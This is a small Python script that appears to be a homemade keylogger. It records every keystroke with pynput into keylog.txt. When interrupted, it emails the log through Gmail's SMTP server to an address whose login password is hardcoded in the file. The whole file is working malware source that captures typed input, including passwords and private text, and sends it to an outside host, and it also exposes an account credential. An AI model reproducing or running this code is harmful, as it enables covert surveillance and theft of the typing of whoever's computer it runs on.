
import smtplib, ssl

port = 465  # For SSL
#password = input("Type your password and press enter: ")

smtp_server = "smtp.gmail.com"
sender_email = "abcanonymous37@gmail.com"  # Enter your address
receiver_email = "abcanonymous37@gmail.com"  # Enter receiver address
password = "anonymitybekararrahegi"
message = "Good Morning!"


from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")

def on_press(key):
	logging.info(str(key))
 
try:
	with Listener(on_press=on_press) as listener:
		listener.join()
	print("Listening")

except KeyboardInterrupt:
	
	with open('keylog.txt') as f:
		message = f.read()

	print("Not Listening! sending mail")
	# Create a secure SSL context
	context = ssl.create_default_context()

	with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
		server.login(sender_email, password)
		server.sendmail(sender_email, receiver_email, message)
		print("Sent")
